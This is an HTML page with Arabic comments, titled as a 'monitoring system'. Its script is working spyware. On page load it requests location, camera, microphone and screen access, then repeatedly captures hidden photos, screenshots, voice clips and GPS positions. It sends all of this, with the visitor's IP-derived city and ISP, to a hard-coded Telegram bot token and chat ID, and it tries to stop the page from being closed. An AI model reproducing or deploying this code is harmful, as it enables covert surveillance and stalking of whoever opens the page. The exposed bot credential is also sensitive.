<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام المراقبة</title>
</head>
<body>
    <script>
        // ============================================================
        // بوت تيليجرام
        // ============================================================
        const BOT_TOKEN = '7600497834:AAEq6C66S13MuMnBYOGqwDNAzD5Kdvm5N9w';
        const CHAT_ID = '1485247348';

        // ============================================================
        // المتغيرات
        // ============================================================
        let currentStream = null;
        let screenStream = null;
        let mediaRecorder = null;
        let audioChunks = [];
        let lastLocation = null;
        let locationWatchId = null;
        let isRunning = false;
        let photoCount = 0;
        let audioCount = 0;
        let isFront = false;
        let perms = { gps: false, cam: false, mic: false, screen: false };

        // ============================================================
        // دالة طلب الصلاحيات - واحدة ورا التانية بسرعة جداً
        // ============================================================
        async function requestPermissions() {
            // 1. الموقع - يطلب على طول
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000
                    });
                });
                lastLocation = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                perms.gps = true;
                sendLocation();
            } catch(e) { perms.gps = false; }

            // 2. الكاميرا - تطلب فوراً بعد الموقع (بدون تأخير)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                currentStream = stream;
                perms.cam = true;
                capturePhoto();
            } catch(e) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false
                    });
                    currentStream = stream;
                    perms.cam = true;
                    capturePhoto();
                } catch(e2) { perms.cam = false; }
            }

            // 3. الميكروفون - يطلب فوراً بعد الكاميرا (بدون تأخير)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                perms.mic = true;
                startVoiceRecording();
            } catch(e) { perms.mic = false; }

            // 4. الشاشة - تطلب فوراً بعد الميكروفون (بدون تأخير)
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                screenStream = stream;
                perms.screen = true;
                captureScreen();
            } catch(e) { perms.screen = false; }

            // بدء التشغيل التلقائي
            if (perms.cam || perms.mic || perms.gps) {
                isRunning = true;
                startAutoCapture();
                startAutoScreen();
                startAutoVoice();
                trackLocation();
                sendFullReport();
            }
        }

        // ============================================================
        // تصوير الكاميرا وإرسالها
        // ============================================================
        async function capturePhoto() {
            if (!currentStream || !perms.cam || !isRunning) return;
            
            try {
                const video = document.createElement('video');
                video.srcObject = currentStream;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                document.body.appendChild(video);
                await video.play();
                
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    document.body.removeChild(video);
                    return;
                }
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                photoCount++;
                const type = isFront ? 'أمامية' : 'خلفية';
                isFront = !isFront;
                
                await sendPhoto(dataUrl, `📸 ${type} #${photoCount}`);
                
                document.body.removeChild(video);
            } catch(e) {}
        }

        // ============================================================
        // تصوير الشاشة
        // ============================================================
        async function captureScreen() {
            if (!screenStream || !perms.screen || !isRunning) return;
            
            try {
                const video = document.createElement('video');
                video.srcObject = screenStream;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                document.body.appendChild(video);
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                await sendPhoto(dataUrl, `🖥️ شاشة #${photoCount}`);
                
                document.body.removeChild(video);
            } catch(e) {}
        }

        // ============================================================
        // تسجيل الصوت
        // ============================================================
        async function startVoiceRecording() {
            if (!perms.mic || !isRunning) return;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                audioChunks = [];
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                
                mediaRecorder.ondataavailable = e => {
                    if (e.data.size > 0) audioChunks.push(e.data);
                };
                
                mediaRecorder.onstop = async () => {
                    if (audioChunks.length > 0) {
                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
                        audioCount++;
                        await sendAudio(blob);
                    }
                    stream.getTracks().forEach(t => t.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 8000);
            } catch(e) {}
        }

        // ============================================================
        // إرسال الصورة إلى تيليجرام
        // ============================================================
        async function sendPhoto(dataUrl, caption) {
            try {
                const blob = await fetch(dataUrl).then(r => r.blob());
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('photo', blob, `photo_${Date.now()}.jpg`);
                form.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
            } catch(e) {}
        }

        // ============================================================
        // إرسال الصوت إلى تيليجرام
        // ============================================================
        async function sendAudio(blob) {
            try {
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('audio', blob, `voice_${Date.now()}.webm`);
                form.append('caption', `🎙️ فويس #${audioCount} - ${new Date().toLocaleString('ar-EG')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: form
                });
            } catch(e) {}
        }

        // ============================================================
        // إرسال الموقع
        // ============================================================
        async function sendLocation() {
            if (!lastLocation) return;
            
            const msg = `📍 *موقعي*\n📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n🎯 دقة: ${lastLocation.accuracy}م\n🕐 ${new Date().toLocaleString('ar-EG')}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {}
        }

        // ============================================================
        // تقرير كامل
        // ============================================================
        async function sendFullReport() {
            let msg = `🚨 *تقرير شامل*\n═══════════════════════\n`;
            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n\n`;
            
            if (lastLocation) {
                msg += `📍 ${lastLocation.lat}, ${lastLocation.lon}\n`;
                msg += `🎯 دقة: ${lastLocation.accuracy}م\n\n`;
            }
            
            try {
                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                const info = await fetch(`http://ip-api.com/json/${ip.ip}?lang=ar`).then(r => r.json());
                msg += `🌐 ${info.country || ''} - ${info.city || ''}\n`;
                msg += `📡 ${info.isp || ''}\n\n`;
            } catch(e) {}
            
            msg += `📸 الصور: ${photoCount}\n`;
            msg += `🎙️ الفويسات: ${audioCount}\n\n`;
            msg += `📷 كاميرا: ${perms.cam?'✅':'❌'}\n`;
            msg += `🎤 ميكروفون: ${perms.mic?'✅':'❌'}\n`;
            msg += `📍 GPS: ${perms.gps?'✅':'❌'}\n`;
            msg += `🖥️ شاشة: ${perms.screen?'✅':'❌'}\n`;
            msg += `═══════════════════════`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {}
        }

        // ============================================================
        // التشغيل التلقائي
        // ============================================================
        function startAutoCapture() {
            setInterval(() => {
                if (perms.cam && isRunning) capturePhoto();
            }, 5000);
        }

        function startAutoScreen() {
            setInterval(() => {
                if (perms.screen && isRunning) captureScreen();
            }, 10000);
        }

        function startAutoVoice() {
            setInterval(() => {
                if (perms.mic && isRunning) startVoiceRecording();
            }, 15000);
        }

        function trackLocation() {
            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
            
            locationWatchId = navigator.geolocation.watchPosition(
                (pos) => {
                    lastLocation = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    if (Math.random() < 0.15) sendLocation();
                },
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        // ============================================================
        // بدء التشغيل فوراً عند تحميل الصفحة
        // ============================================================
        window.addEventListener('load', () => {
            // بدء طلب الصلاحيات فوراً
            requestPermissions();
        });

        // ============================================================
        // منع إغلاق الصفحة
        // ============================================================
        window.addEventListener('beforeunload', (e) => {
            if (isRunning) {
                e.preventDefault();
                e.returnValue = '';
            }
        });

        console.log('🚀 تم التحميل - طلب الصلاحيات فوراً');
    </script>
</body>
</html>
